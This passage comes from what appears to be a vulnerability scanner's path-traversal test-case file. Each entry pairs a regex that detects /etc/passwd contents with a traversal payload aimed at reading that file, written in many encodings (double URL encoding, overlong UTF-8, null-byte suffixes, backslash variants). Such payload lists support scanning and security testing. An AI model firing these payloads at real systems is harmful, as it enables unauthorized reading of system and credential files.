        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "////etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010045,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "//\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../\\\\../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010046,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../../../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010043,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\.\\\\\\\\..\\\\\\\\etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010040,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010041,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010042,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\.\\\\/\\\\.\\\\etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010039,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c..0x5cetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010036,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/../../../../../../../etc/passwd%00",
        "encode":  "NO",
    },

    {
        "case_id": 1040010037,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/../../../../../../../etc/passwd%00.jpg",
        "encode":  "NO",
    },

    {
        "case_id": 1040010038,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/../..//../..//../..//../..//../..//etc/passwd%00.",
        "encode":  "NO",
    },

    {
        "case_id": 1040010035,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/../../../../../../../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010030,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010031,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010032,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215..%u2215etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010034,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/../../../../../../../../../../etc/passwd\\0.jpg",
        "encode":  "NO",
    },

    {
        "case_id": 1040010029,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010028,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010027,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255cetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010025,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/%uff0e%uff0e/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010026,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010023,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010024,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010022,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010020,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010021,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\%2e%2e\\etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010019,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010018,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010014,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010015,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%252e%252e\\\\%252e%252e\\\\%252e%252e\\\\%252e%252e\\\\%252e%252e\\\\%252e%252e\\\\%252e%252e\\\\%252e%252e\\\\etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010016,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25afetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010017,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%2/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c5c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010012,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010013,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "/%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cetc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010010,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "././././././../../../../../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010011,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": ".\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./.\\\\\\\\./etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010009,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010008,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "../../../../../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010007,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "../../../../../../../../../../etc/passwd%00.",
        "encode":  "NO",
    },

    {
        "case_id": 1040010005,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010006,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "../../../../../../../../../../etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010004,
        "target": "((root|bin|daemon|sys|system|sync|games|man|mail|news|www-data|uucp|backup|list|proxy|gnats|nobody|syslog|mysql|bind|ftp|sshd|postfix):[\\d\\w-\\s,]+:\\d+:\\d+:[\\w-_\\s,]*:[\\w-_\\s,\\/]*:[\\w-_,\\/]*[\\r\\n])|(TLib_[A-Za-z]{1,8}_[A-Za-z]{1,8}\\(\\):)|(root:x:0:0:|bin:x:|nobody:x:|system:x:0:0)",
        "input": "../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd",
        "encode":  "NO",
    },

    {
        "case_id": 1040010003,
